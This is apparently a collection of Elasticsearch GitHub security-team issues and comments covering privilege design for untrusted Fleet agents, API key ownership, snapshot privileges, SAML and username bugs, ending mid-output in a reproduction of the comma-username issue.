- Support `remote_indices` for (QC-side, normal) API keys (see my inline comment in `ApiKeyService`)
- Support `remote_indices` for build-in roles and users
- Support file-based definitions of roles with remote indices
- Show `remote_indices` in `GetUserPrivileges` response
- (Potentially) gracefully handle (or fail) `HasPrivileges`    @elasticsearchmachine run elasticsearch-ci/docsPinging @elastic/es-security (Team:Security)",yes,">non-issue,:Security/Authorization,Team:Security,v8.6.0,"
elastic/elasticsearch,799663681,"Append-only privilege for untrusted endpoints","In order to grant minimal permissions to untrusted endpoints, we need a privilege that permits append-only indexing, auto-creation of target indices or data streams only if there is an existing template, and prohibits mapping changes.
","Pinging @elastic/es-core-features (Team:Core/Features)Pinging @elastic/es-security (Team:Security)@danhermann [ping us](https://github.com/elastic/kibana/issues/90164) when it's ready for testing.@danhermann have you already considered to use `create_doc`? In 7.x it allows mapping updates, but it won't anymore in 8.x. For the index creation, is `create_index` too permissive?@danhermann, I remain concerned that auto-creation of data streams or target indices is an issue for untrusted endpoints.  Since we have built-in templates for data streams such as ""metrics-*-*, logs-*-*, and synthetics-*-*"", an attacker with append-only privileges could without restriction create thousands of data streams.

Just to see what would happen, I created an apikey with only ""create_doc"" and ""indices:admin/auto_create"" privs.  I was surprised to see that the data streams are created, but the indexing failed:

```
{
  ""error"" : {
    ""root_cause"" : [
      {
        ""type"" : ""security_exception"",
        ""reason"" : ""action [indices:admin/mapping/auto_put] is unauthorized for API key id [1UWzaXcBN6DMbwHTWSLc] of user [elastic] on indices [.ds-logs-attack-003-2021.02.03-000001], this action is granted by the privileges [auto_configure,manage,write,all]""
      }
    ],
    ""type"" : ""security_exception"",
    ""reason"" : ""action [indices:admin/mapping/auto_put] is unauthorized for API key id [1UWzaXcBN6DMbwHTWSLc] of user [elastic] on indices [.ds-logs-attack-003-2021.02.03-000001], this action is granted by the privileges [auto_configure,manage,write,all]""
  },
  ""status"" : 403
}
```

Elastic log:

```
│ info [o.e.c.m.MetadataMappingService] [MacBook-Pro.local] [.ds-logs-mydosattack-002-2021.02.03-000001/AcH7vGL1RVC0TdX-3mrDtw] update_mapping [_doc]
   │ info [o.e.c.m.MetadataMappingService] [MacBook-Pro.local] [.ds-logs-attack-002-2021.02.03-000001/RiiKWUPdQBeSgPjgZFGXNg] update_mapping [_doc]
   │ info [o.e.c.m.MetadataCreateIndexService] [MacBook-Pro.local] [.ds-logs-attack-003-2021.02.03-000001] creating index, cause [initialize_data_stream], templates [logs], shards [1]/[1]
   │ info [o.e.c.m.MetadataCreateDataStreamService] [MacBook-Pro.local] adding data stream [logs-attack-003] with write index [.ds-logs-attack-003-2021.02.03-000001] and backing indices []
   │ info [o.e.x.i.IndexLifecycleTransition] [MacBook-Pro.local] moving index [.ds-logs-attack-003-2021.02.03-000001] from [null] to [{""phase"":""new"",""action"":""complete"",""name"":""complete""}] in policy [logs]
   │ info [o.e.x.i.IndexLifecycleTransition] [MacBook-Pro.local] moving index [.ds-logs-attack-003-2021.02.03-000001] from [{""phase"":""new"",""action"":""complete"",""name"":""complete""}] to [{""phase"":""hot"",""action"":""unfollow"",""name"":""wait-for-indexing-complete""}] in policy [logs]
   │ info [o.e.x.i.IndexLifecycleTransition] [MacBook-Pro.local] moving index [.ds-logs-attack-003-2021.02.03-000001] from [{""phase"":""hot"",""action"":""unfollow"",""name"":""wait-for-indexing-complete""}] to [{""phase"":""hot"",""action"":""unfollow"",""name"":""wait-for-follow-shard-tasks""}] in policy [logs]
```

@ruflin and I have been discussing a model where Kibana uses the data stream api to pre-create the target data streams before dispatching the policies to the agents.  In that scenario, an append-only privilege would be very restrictive: no data stream/index creation, no new mapping.  Ie., only add a document if the target exists.

Thoughts?


@scunningham, it sounds like `create_doc` is all you need if your data streams are created in advance by something else and they do not have dynamic mappings?@danhermann The templates contain dynamic mappings. Some of the templates we could probably remove it but not all of them. I wonder if runtime fields could come to our rescue here. We disable dynamic mapping but because of runtime fields it will still be queryable?Perhaps we just need to introduce a new role that allows dynamic mapping updates or modify the existing `create_doc` privilege to also grant dynamic mapping updates?IMHO, dynamic mappings are too dangerous a privilege to grant to an untrusted endpoint:

1. An attacker could overwhelm the index with a bunch of bogus mappings intended to prevent new valid mappings from being created, hitting the mapping limits.
2. An attacker could, if the timing is right, purposely mis-map a field such that subsequent valid documents would fail due to mapping exceptions.

To support only ""create_doc"", the dynamic mapping would need to be removed from the data stream templates, and all data streams would have to be created *before* the agents start streaming data.

The built-in index_templates for logs*,metrics*,synthetics*, etc, all contain a dynamic template:

```
 ""dynamic_templates"" : [
              {
                ""strings_as_keyword"" : {
                  ""mapping"" : {
                    ""ignore_above"" : 1024,
                    ""type"" : ""keyword""
                  },
                  ""match_mapping_type"" : ""string""
                }
              }
            ],
```

Removing dynamic templates to lock down untrusted endpoints would be a significant departure from current behaviors.  I don't think this is a problem that should be solved _primarily_ through security.

If there are specific endpoints (agent policies?) that should never use dynamic mapping or dynamic index creation then it's reasonable not to grant them those privileges (`auto_configure`). In fact this is why we made it a explicit privilege for data stream - so that you can have an ingestion key that has `create_doc` only, and nothing else.

_**But**_, if you leave it at that, then it's just setting things up to fail. Within ES security, in general we don't decide whether to do something based on whether it is allowed by security. We attempt to do it because the system is configured to do that thing, and then we fail if security prevents it.  
So, if an index/data stream is configured with dynamic templates, and a new field is ingested that matches that template we will attempt to perform a mapping update, and will _fail_ if the user is not allowed to perform auto-mapping updates.  

If there is a _system_ configuration that says to do something, and alongside that is a _security_ configuration that says to prevent something, then there is a conflict and it will typically result in an error.

I think what we need to be talking about is how do we configure the system so that these data streams _never_ attempt to perform dynamic mapping changes, and then removing that privilege from the ingestion key is straight forward.
 I'd be curious to get more context around this feature request.

Dynamic mapping updates are needed for some data sources that can't provide a schema up-front, and are also important for the onboarding of new data sources, so I wonder how we plan to make this work if we start disallowing dynamic mapping updates on untrusted endpoints. Will we need to have a concept of trusted endpoints too, and if so, on what criterion would an endpoint be trusted or not?

> @ruflin and I have been discussing a model where Kibana uses the data stream api to pre-create the target data streams before dispatching the policies to the agents

I like that it removes the need for untrusted endpoints to create data streams but I wonder how it works in the case of a standalone agent setup. Or do we not foresee a need for doing standalone deployments of untrusted endpoints?

For my understanding, would it be an option to only give privileges to a finite set of data streams to untrusted endpoints to avoid letting them create thousands of data streams the way that @scunningham described?

>  I wonder if runtime fields could come to our rescue here. We disable dynamic mapping but because of runtime fields it will still be queryable?

Configuring mappings with `dynamic:false` and defining runtime fields as part of search requests would ""work"", but this has limitations too e.g. such fields would not be suggested via Kibana so it's unclear how users would learn about them in the first place, and they could be slow to search or aggregate.Let me attempt to frame the problem a bit better.

In the field, we expect Fleet Agents to execute in various environments along a broad risk spectrum:

- **Trusted**: Systems behind layered defenses with robust security controls and limited access; high value servers etc.
- **Untrusted**: Systems in largely uncontrolled environments with minimal security controls; think laptops in a coffee shop, undergraduate computer labs, or systems accessible by a rogue employee. 
 
The Fleet system, as implemented today, prioritizes supporting trusted environments.  For 7.11,  the Fleet implementation (in Kibana at the moment) generates a default Elastic Search api key which it provides to each of its integrations.  This default key has broad [privileges](https://github.com/elastic/kibana/blob/7.11/x-pack/plugins/fleet/server/services/api_keys/index.ts#L23):


```
{
	""fleet-output"": {
		""cluster"": [""monitor""],
		""index"": [{
			""names"": [
				""logs-*"",
				""metrics-*"",
				""traces-*"",
				"".ds-logs-*"",
				""ds-metrics-*"",
				""ds-traces-*"",
				"".logs-endpoint.diagnostic.collection-*"",
				"".ds-.logs-endpoint.diagnostic.collection-*""
			],
			""privileges"": [
				""write"",
				""create_index"",
				""indices:admin/auto_create""
			]
		}]
	}
}
```

What are the types of attacks that are possible per privilege:

- write
	- Update or delete existing records, effective corrupting any document in any of the wildcarded indices
	- Arbitrary dynamic mapping updates; allowing attacker to corrupt or exhaust mappings as previously described in discussion
- create_index
	- Create any index in the above wild carded namespace, either
		- Starving the system by creating thousands of indices
		- Racing the system to create a known indices and corrupting its mappings, settings, etc.
- indices:admin/auto_create
	- Similar to create_index; can create arbitrary data streams in the index simply by indexing a document

[Note that normal denial of service attacks are not discussed here.  DOS attacks leveraging legitimate operations remain an issue, but are outside the scope of this document.  This discussion is limited to attacks that could corrupt data or destabilize the system.]

For 7.12, the privileges have been locked down a bit, however, data stream creation attacks and dynamic mapping attacks are still possible:

```
 {
 	""fleet-output"": {
 		""cluster"": [""monitor""],
 		""index"": [{
 			""names"": [""logs-*"",
 				""metrics-*"",
 				""traces-*"",
 				"".logs-endpoint.diagnostic.collection-*""
 			],
 			""privileges"": [
 				""auto_configure"",
 				""create_doc""
 			]
 		}, ],
 	},
 }
```



At the extreme untrusted edge of the risk spectrum, ideally an agent would **only** have append privileges.  This should be the default behavior of the agent in a high risk environment; ie. the system fails closed if additional privileges have not been explicitly granted.  This is different from the current behavior, which fails open for our default installation.

However, we do have legitimate cases where an integration may require dynamic mapping and potentially dynamic data stream creation as well. Perhaps in those cases, we can generate a more specific api_token that grants the required permission for a set of fully qualified indices.  That would limit the attack surface to the indices that require this functionality.  In an environment on the trusted end of the spectrum, this may be an acceptable risk.

Fundamentally, the problem we are trying to address is that there is currently no one security posture that will accommodate the needs of all the applications, as well as provide reasonable defense against known attacks.



@mostlyjason @urso @andresrc ^ please have a look.>  we can generate a more specific api_token that grants the required permission for a set of fully qualified indices

I imagine a common workflow is that a security operations team tests a monitoring solution in a internal environment first before deploying to an untrusted environment? In this case, the internal environment can fully quality the indices before the untrusted environment sends data. The downside is that its extra steps for the operator to bootstrap those dynamic indices, but this could be seen as a more advanced use case. I'm not sure if rollover indices to initialize with the same dynamic mapping from the prior one? If not, that might be a good addition so it continues working on rollover.> Perhaps in those cases, we can generate a more specific api_token that grants the required permission for a set of fully qualified indices. 

From a least-privilege point of view, that seems wise. Even if we were to solve the mapping & index creation problem described above, there would still be residual risks if we gave untrusted endpoints the ability to append to an unnecessarily wide range of indices 

Thanks @scunningham, this makes sense to me and how we are thinking of trusted vs. untrusted endpoints in particular was helpful. One aspect I'll be interested in is how we know whether an endpoint is trusted or not, e.g. does it require manual action from the user or is it something that can be inferred from the datasets that are enabled on that endpoint?@jpountz We've not come up with a way to know from the agent's standpoint whether it is trusted.  Fleet would have be told somehow, only the customer can really make that assertation.  The reality is that the customer is in a difficult position to make that assessment.  Security operators are often dealing with huge populations of endpoints in a very dynamic environment; with new endpoints arriving and old ones dropping off constantly.  Defaulting to a trusted mode, and asking the customer to manually take an action when agents should be untrusted  is risky.  For that reason, in my opinion, fleet agents should be untrusted by default.

We should be able to infer from the integration definitions whether or not an integration is considered ""untrusted"" and adjust the privileges accordingly.  If the customer adds an integration to a policy that requires higher privileges, we should notify the user and ask them explicitly to opt in.  The user will be responsible for maintaining the list of agents associated with this policy.

There's a lot of subtlety here around permissions how ""risky"" they actually are.  It is probably a mistake to blanket mark a policy as ""untrusted"" if, for example, we only add read permissions to a specific innocuous index.  We shouldn't underestimate the UX complexity here.

@ruflin has put forth a [propsal](https://github.com/elastic/fleet-server/issues/101) which I think is a good compromise of least privilege per data stream.  I am hopeful that this approach, coupled with pre-creation of all but the dynamically created data streams will mitigate many of the concerns described above.  However, we've yet to come up with a solution to the dynamic mapping denial of service attack short of disabling dynamic mapping entirely in the untrusted case.




If trusted or not should not be dependent on the dataset. The same dataset (data stream) can be used in different context. Lets take a simplified nginx example. In one case, we monitor nginx on an untrusted machine. Because of this, we have append only, no dynamic fields and no creation of data streams as permissions shipped down. This nginx monitoring cannot add any dynamic fields which were not predefined. On the other hand, we monitor nginx services in k8s. There the namespace might be dynamic and also the labels added to each event are dynamic. This requires the Elastic Agent to run in a trusted environment as we ship down more permissions. The resulting data stream for both events could be the same, what is the different is the policy and the permissions on it.",no,">enhancement,:Security/Authorization,:Data Management/Data streams,Team:Data Management,Team:Security,"
elastic/elasticsearch,317448148,"[docs] Document detailed permissions needed to perform various REST API calls","*Original comment by @inqueue:*

This request originated from a user stumbling through getting the _reindex API, in async mode, to run with the appropriate permissions. Flow:

>We create a index.
>We execute a /_reindex task.
> We `Get /_task/taskIdFromReindex` (this is successful)

In logs we see:
```
{ couldn't store response BulkIndexByScrollResponse[took=43.7ms,timed_out=false,sliceId=null,updated=13,created=0,deleted=0,batches=1,versionConflicts=0,noops=0,retries=0,throttledUntil=0s,bulk_failures=[],search_failures=[]]
org.elasticsearch.ElasticsearchSecurityException: action [indices:admin/create] is unauthorized for user }
```

>We then execute `Get /_task/taskIdFromReindex` (this fails with 403 forbidden.)

In this case, the error occurred because the user did not have create and write privileges to the `.tasks` index which is not clear from product documentation or usage. This can be a frustrating experience for the end user if they are just trying to perform a reindex.

Can the permission requirements for `_reindex` and other APIs be clearly documented for X-Pack?","*Original comment by @jasontedor:*

I don’t think this is a documentation issue. In my mind this an implementation detail and the user should not need these permissions instead they should be implied by other permissions user has.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,941616580,"Inconsistency between ownership, manage_api_key and manage_own_api_key ","The de-facto ownership within ES security domain is defined as the pair of username and realm_name. This applies to API keys as well. However there are some inconsistencies in how the ownership is handled in certain places. Nothing is a security issue, but rather user experience in some edge cases. 

A few facts as of today (7.14):
1. The ownership of a [derived API key](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-create-api-key.html#security-api-create-api-key-prereqs) is (1) the username of the original user and (2) the synthetic `_es_api_key` realm name. 
2. If an API key only has `manage_own_api_key` privilege, it is [not allowed](https://github.com/elastic/elasticsearch/blob/2e64ef12f7eb8bd2959ec3f7147f1a403f0c4200/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/security/authz/privilege/ManageOwnApiKeyClusterPrivilege.java#L97-L99) to call `GET _security/api_key?owner=true` because ""an API key cannot own any other API key"" (this statement is debatable)
3. If an API key has `manage_api_key` privilege, the call `GET _security/api_key?owner=true` returns a list of keys owned by the original user. 

The above behaviours beg the following questions:
* What is the identity of an API key? Based on **3**, it is the original username and realm_name, which is also how it is handled in other places like audit. But how does this definition of identity work with dervied API keys?
* Because of **1**, a derived API key effectively has no owner, i.e. you cannot get it back with `GET _security/api_key?owner=true` using any authentication.
* If ""an API key cannot own any other API key"" is to be upheld, we should _not_ allow **3** to happen. Otherwise, we should allow **2**. So either 2 or 3 should be fixed.

Also note when it comes to async search and scroll, the user and any of its API keys [are *not* allowed to share the results](https://www.elastic.co/guide/en/elasticsearch/reference/7.14/security-limitations.html#can-access-resources-check). This behaviour is somewhat contradictary to **3**.","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1183625107,"[DOCS] Add documentation to explain the permissions required to use enrich pipelines and to execute enrich policies","### Description

I think this is a leftover of https://github.com/elastic/elasticsearch/issues/41939

We need to add:
- What are the permissions to execute an Enrich policy (`read` & `read_index_metadata` permissions on the source index of the enrich policy + `enrich_user`)
- What are the permissions to use an enrich processor in a ingest pipeline
","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-data-management (Team:Data Management)",no,">enhancement,:Data Management/Ingest Node,Team:Data Management,Team:Security,"
elastic/elasticsearch,317453999,"Cleanup XPackPlugin, Security, Watcher, Monitoring enabled/disabled logic","*Original comment by @jaymode:*

In LINK REDACTED @s1monw mentioned that we have a lot of bloat when security is not enabled. He suggested that we can look into not even calling the Security class if it is not enabled. The same would also apply to Watcher and Monitoring.

",,no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,925970066,"Read-only privilege for _template API","For some usecases it may be useful for a user to be able to see the templates without being able to modify them; e.g. in debugging mapping issues. For this purpose it would be nice to have a `read_index_templates` cluster privilege.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,904108794,"Different search response codes for identical user roles","**Elasticsearch version**: 7.8

**Plugins installed**: None

**JVM version** (`java -version`): AdoptOpenJDK/OpenJDK 64-Bit Server VM/14.0.1/14.0.1+7

**OS version** (`uname -a` if on a Unix-like system): Linux/4.15.0-142-generic/amd64

**Description of the problem including expected versus actual behavior**:

User receives a 403 forbidden response on search request when assigned a particular role. However, changing the user's role to an identical role with a different name allows a 200 OK response to the search query.

Why does the behaviour differ for the user betweeh two different roles with identical permissions? I emphasize that the permissions are identical.

**Steps to reproduce**:

1. I add a new user to the system.
2. I create a new role called ""index-reader"" with the following privileges:
    * Indices - Index: `*`. Privileges: `read, view_index_metadata`.
    * Kibana - Spaces: `all`. Priviledges: `read` for Discover, Visualize, Dashboard, Dev Tools.
3. New user logs in to UI and goes to Console. Note that this user **only has the single role from step 2**.
4. User runs the following command:
```
GET /np.foo.bar/_search
{
  ""query"": {
    ""match_all"": {}
  }
}
```
5. User receives the following error response:
```
{
  ""error"" : {
    ""root_cause"" : [
      {
        ""type"" : ""security_exception"",
        ""reason"" : ""action [indices:data/read/search] is unauthorized for user [my_user]""
      }
    ],
    ""type"" : ""security_exception"",
    ""reason"" : ""action [indices:data/read/search] is unauthorized for user [my_user]""
  },
  ""status"" : 403
}
```
6. I create a new role called ""test"".
7. I assign identical privileges to this new role as the previous role ""index-reader"".
8. I change the user to remove the old role and add the new role.
9. User repeats the search command at the console.
10. User receives a successful search response.

**Provide logs (if relevant)**:


","Pinging @elastic/es-security (Team:Security)@boonware Thank for openning the issue. It however does not reproduce for me. I suspect either the user didn't get the `index-reader` role in the beginning or the `index-reader` role wasn't created correctly. Could you please provide some more information by performing the followings?

After step 5, execute the following API calls and provide the output:
* `GET /_security/_authenticate` with the new user
* `GET /_security/role/index-reader` with another user that has permission to read role definitions or just superuser

The above outputs should confirm the user's role assignment and exact role definition of the role. We should be able to tell whether there is any mismatch.

In addition, could you please run `POST /_security/role/*/_clear_cache` after step 5 (you need a superuser to run this), then re-run step 4 (with the new user). This is to rule out any edge case caching issue. Thanks!@boonware Were you able to reproduce this issue with the output @ywangd requested?",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317454054,"If a Shield node attempts to join a non-Shield cluster, the error message is not helpful","*Original comment by @jaymode:*

_From @seang-es on September 16, 2015 14:42_

A customer attempted to add Shield to an existing cluster during a rolling upgrade.  The original cluster was not Shield-enabled, the new nodes were.  The new nodes did not successfully join, as we would expect, but the logged error message did not make clear what was happening:

[2015-09-11 11:49:20,519][INFO ][discovery.zen ] [Shrunken Bones] failed to send join request to master [[Luna][ofyMPHT9QFmTvkusC4DopA][phx5qa01c-a72f.stratus.phx.qa.ebay.com][inet[/10.109.146.99:9310]]{master=true}], reason [RemoteTransportException[[Luna][inet[/10.109.146.99:9310]][internal:discovery/zen/join]]; nested: RemoteTransportException[Failed to deserialize exception response from stream]; nested: TransportSerializationException[Failed to deserialize exception response from stream]; nested: InvalidClassException[failed to read class descriptor]; nested: ClassNotFoundException[org.elasticsearch.shield.authc.AuthenticationException]; ]

Improved logging would help here.




","Installing shield on all the nodes worked for me. ",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,786323003,"Manage snapshot cluster privilege","Drawing inspiration from https://www.elastic.co/guide/en/elasticsearch/reference/current/slm-and-security.html it appears that we're lacking a kind of `manage_snapshot` cluster privilege.
We currently have the `monitor_snapshot` and `create_snapshot` privileges and I think it would be sensible to also add a new `manage_snapshot` one.

* `monitor_snapshot` permits listing the repositories, not only the snapshots inside the repositories, in addition to the obvious snapshot status check.
* `create_snapshot` extends `monitor_snapshot`, to also grant permission to create snapshots to existing repositories
* `manage_snapshots` , I think, should extend `create_snapshot` to permit deleting snapshots and deleting repositories.
Importantly, I don't think it should grant permissions to create repositories, because that would grant access to transfer data to any accessible location of the user's choice (IMO `manage` is a fitting privilege for that).","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,958106352,"Adjust tests to run with security enabled","As part of https://github.com/elastic/elasticsearch/pull/72300 we are explicitly disabling security for certain tests, not because this is strictly required but because these tests were written with the assumption that security is disabled ( trial or basic license without explicit configuration ). We ( as in the elasticsearch team with guidance and help from the es-security team ) should take up the effort and adjust these tests so that they can run with our default configuration which is that security is enabled. 

- [ ] `EnrichMultiNodeIT`
- [ ] `EnrichRestartIT`
- [ ] `BasicEnrichTests`
- [ ] `EnrichPolicyUpdateTests`
- [ ] `EnrichResiliancyTests`
- [ ] `TransformInternalIndexIT`
- [ ] `TransformNoRemoteClusterClientNodeIT`
- [ ] `TransformNoTransformNodeIT`
- [ ] `CCSTermsEnumIT`
- [x] `qa/os/src/test/java/org/elasticsearch/packaging/util/Archives`
- [x] `qa/os/src/test/java/org/elasticsearch/packaging/util/Packages`
- [x] Packaging Tests","Pinging @elastic/es-security (Team:Security)",no,">test,Meta,:Security/Security,Team:Security,"
elastic/elasticsearch,548217741,"Unit tests for index and cluster privileges","Lately, see https://github.com/elastic/elasticsearch/pull/50489#issuecomment-570996449 and https://github.com/elastic/elasticsearch/pull/50643 we've learned that we miss unit test cases for index and cluster privileges. Right now we test them in the integ tests , `IndexPrivilegeTests` and `ClusterPrivilegeTests`, but we need to test which actions a privilege grants without having to start a cluster node and create a role and an user; these tests are more suited for a mix of privileges/roles to test the full authorization mechanism.

I think we need a new class of tests, modeled after the `AuthorizationServiceTests`, where we can pick on every privilege and every index (and cluster) action.","Pinging @elastic/es-security (:Security/Authorization)hi @albertzaharovits is this ready to pick up?Hi @amirhmd , yes, I have assigned it to you.

Upon looking closer, I think it's better to base the new privileges unit tests upon the `IndicesPermission` class instead of `AuthorizationService`. You can follow as an example the `IndicesPermissionTests`. I've changed my mind because the `AuthorizationService` deals with actions as well as the requests (and the index names contained in those requests) that trigger those actions; it's at a higher level than what a **test suite for actions and privileges** is concerned about.

I would start by creating a test for a certain cluster privilege (eg `monitor`) and then run the `IndicesPermission#authorize` through a **list of action names**. You can get a list of action names by looking at subclasses of `ActionType`, eg `DeleteDatafeedAction#NAME`. It's not yet clear to me how best to construct this list, we'll need to experiment a bit.
But, given that actions can spawn sub-actions, which have a related name, but which are not _described_ anywhere in the action definition (they are a consequence of how the action is coded) we would still need integration tests to assure a privilege is enough to successfully run certain actions. Yet this is not a _privilege_ test, it is an _action_ test, and writing these _privilege unit tests_ would allow us to learn which actions require further integration tests.

Thanks @albertzaharovits for the explanation. will ping you if I have a question.",no,">test,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317449247,"Audit changes to files used by x-pack","*Original comment by @jaymode:*

Currently we monitor the files used by the file based realm and also files used for SSL communication, and in some places we log that the file changed. In some situations it is desirable to have the content that was changed also be audited. In the most basic implementation, when a change is detected the entire file can audited. An improvement on this could be the use of a diff style view to see what was changed.


",,no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,317446936,"authentication token extraction should be moved to its own entity","*Original comment by @jaymode:*

I was doing some experimenting using the custom realms and saw some interesting behavior. In the example custom realm, the authentication mechanism is not basic authentication but is a custom authentication ""scheme"" based on username and passwords in headers. The realm doesn't check for basic authentication, but when I provided valid credentials for the custom realm using basic auth and had the esusers realm enabled, I was able to authenticate. This is not the way it should work IMO.

This happened because the custom realm uses the provided `UsernamePasswordToken`. This token does not imply that it must be used for Basic authentication; if it did then this should be named a `BasicAuthenticationToken`. However, we have a lot of static methods in this token that deal with BasicAuthentication, so maybe we should split this into two classes?

What I am proposing is to change to our authentication service. Rather than iterating over all realms and calling the `token` method until we find one and then iterate over the realms again until the token is supported and can be authenticated, we do the following:
- A single loop in the Authentication service over the realms
  - `token` is called. If a token is returned, call `authenticate`. If `authenticate` returns a user, break the loop
- We keep track if a `token` was returned by any realm. If there was no `token`, consider the request anonymous
- remove the `supports` method in the realm since we do not need it anymore.
- create a `BasicAuthenticationToken` that extends `UsernamePasswordToken`

In the case where there are multiple realms of the same type/token type, this means that we extract a token more than once. This requires more computation/memory but overall I don't think it will have that big of an impact and the authentication is correct.


","*Original comment by @uboness:*

not sure about this. 

The intention was never to bind any realm to basic auth, but instead to an authentication token. And auth token represents the information a realm needs in order to perform authentication. That's why the name `UsernamePasswordToken`, because the information that is required is a username and a password. The fact that we're now bound to basic auth is simply because that's the simplest and widely used standard mechanism for attaching/extracting username/password to/from a request.

if there are 2 realms - `A` and `B`, and they both require a username/password pair to perform authentication. I care less about were these username/password pairs came from, and care more that once we have them, and both realms support this kind of authentication token, we try them both. At least that's the rational behind the current implementation.

It depends on how we would like to view realms and work with the same auth token (as I described auth token above). If esusers and LDAP both support username/password... lets say that you create a new `BasicAuthToken`... what does it change in the context of these two realms? they still both need to extract the same token from the request, in the same way. And lets say that tomorrow we'll come up with another mechanism to extract the username/password from the request, we'd still want to implement that for both right?... so if we're extracting it for one, why not just extract it for both in one go. At the end of the day, they both require us to do the exact same thing... call it basic auth, call it username/password token... I don't think it matters... except that with `BasicAuthToken` you're ""forcing"" the realm to define a single mechanism for extracting the username/password from the request.

I'm not saying what you're proposing is wrong... I'm just saying that I'm not sure if it's more right. If you strongly believe we need to change how it works now, I'm fine with it. But I don't think renaming `UsernamePasswordToken` to `BasicAuthToken` makes sense in the context of the proposed change.
*Original comment by @jaymode:*

> But I don't think renaming UsernamePasswordToken to BasicAuthToken makes sense in the context of the proposed change.

+1 (more on why below)

>  I care less about were these username/password pairs came from, and care more that once we have them, and both realms support this kind of authentication token, we try them both. At least that's the rational behind the current implementation.

This makes sense to me and now I want to take a different approach. I think what we should decouple the token extraction from the realm and the token itself. The token is just a representation of authentication credentials; `UsernamePasswordToken` merely represents that a username and password combination was presented, it doesn't matter how it was presented like you say. The Realm is an authentication source. So we could have the concept of token extractors or something that will return the token found in the request. The realm will still keep the `supports` method. What do you think?
@jaymode is this still relevant?It is still relevant but should be a team discuss (cc @elastic/es-security)",no,":Security/Authentication,team-discuss,Team:Security,"
elastic/elasticsearch,317448351,"[security saml] OpenSAML fails on Turkish locale","*Original comment by @tvernum:*

OpenSAML has this code in `KeyDescriptorUnmarshaller` [(source)](https://git.shibboleth.net/view/?p=java-opensaml.git;a=blob_plain;f=opensaml-saml-impl/src/main/java/org/opensaml/saml/saml2/metadata/impl/KeyDescriptorUnmarshaller.java;hb=HEAD)
```
UsageType usageType = UsageType.valueOf(UsageType.class, attribute.getValue().toUpperCase());
// Only allow the enum values specified in the schema.
if (usageType != UsageType.SIGNING && usageType != UsageType.ENCRYPTION) {
    throw new UnmarshallingException(""Invalid key usage type: "" + attribute.getValue());
}
```

On a turkish locale, that `toUpperCase` doesn't behave as expected (result: `SİGNİNG`) and you get an error with
> Invalid key usage type: signing

which is nonsense - `signing` is a perfectly valid key type.

We need to work out an approach to this - we might be able to push a patch upstream, but I doubt this will be the first such issue.
","*Original comment by @jaymode:*

We should fix this upstream and I think we can workaround the issue. I did some digging, the value for `tests.locale` is used in the `TestRuleSetupAndRestoreClassEnv` class from lucene. There is not a way to blacklist a locale. I think we would have to run our own before/after methods to essentially swap the locale if it is a Turkish locale until we can get the upstream fix incorporated and released.*Original comment by @tvernum:*

https://issues.shibboleth.net/jira/browse/OSJ-224*Original comment by @albertzaharovits:*

I have pushed 72a6abd3a9ae7f1de7 and 9c4ecabe4846d32820980b4 to address:
LINK REDACTED

Sorry, I missed to reference the issue in the commit message.

TV: Now fb8adb4a1c6c3d8a4f8074dbffae7ee92e97e1cd",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,868500289,"Comma is not(?) a valid username","**Docker image**: `elasticsearch:7.12.0`

**Elasticsearch version** (`bin/elasticsearch --version`): 7.12.0

**Plugins installed**: []

**JVM version** (`java -version`): 15.0.1

**OS version** (`uname -a` if on a Unix-like system): Linux 5.4.108 1-NixOS SMP Wed Mar 24 10:26:46 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

**Description of the problem including expected versus actual behavior**:

It is possible to create a user with the username `,`, but trying to retrieve it, you get all the users instead.

The [create user API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-put-user.html) states that usernames must be between 1 and 1024 characters long, composed of printable ASCII characters, without leading or trailing spaces. This makes `,` a valid username. However, the behavior of the [get users API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-get-user.html) in response is suspicious.

**Steps to reproduce**:

Start Elasticsearch in a Docker container, with security enabled (I set the password here, as I'm not sure what the default one is):

(**Update:** I figured out that I could set `xpack.security.enabled` via an environment variable, making the Docker image easier to run.)

```
$ docker run \
  --rm \
  --network=host \
  -e ""xpack.security.enabled=true"" \
  -e ""ELASTIC_PASSWORD=password"" \
  -e ""discovery.type=single-node"" \
  elasticsearch:7.12.0
```

Then, in another terminal:

```
$ curl \
  -u elastic:password \
  -H ""Content-Type: application/json"" \
  -X PUT -d '{""password"": ""password"", ""roles"": []}' \
  localhost:9200/_security/user/%2C
{""created"":true}
$ curl \
  -u elastic:password \
  localhost:9200/_security/user/%2C?pretty
{
  ""elastic"" : {
    ""username"" : ""elastic"",
    ""roles"" : [
      ""superuser""
    ],
    ""full_name"" : null,
    ""email"" : null,
    ""metadata"" : {
      ""_reserved"" : true
    },
    ""enabled"" : true
  },
  ""kibana"" : {
    ""username"" : ""kibana"",
    ""roles"" : [
      ""kibana_system""
    ],
    ""full_name"" : null,
    ""email"" : null,
    ""metadata"" : {
      ""_deprecated"" : true,
      ""_deprecated_reason"" : ""Please use the [kibana_system] user instead."",
      ""_reserved"" : true
    },
    ""enabled"" : true
  },
  ""kibana_system"" : {
    ""username"" : ""kibana_system"",
    ""roles"" : [
      ""kibana_system""
    ],
    ""full_name"" : null,
    ""email"" : null,
    ""metadata"" : {
      ""_reserved"" : true
    },
    ""enabled"" : true
  },
  ""logstash_system"" : {
    ""username"" : ""logstash_system"",
    ""roles"" : [
      ""logstash_system""
    ],
    ""full_name"" : null,
    ""email"" : null,
    ""metadata"" : {
      ""_reserved"" : true
    },
    ""enabled"" : true
  },
  ""beats_system"" : {
    ""username"" : ""beats_system"",
    ""roles"" : [
      ""beats_system""
    ],
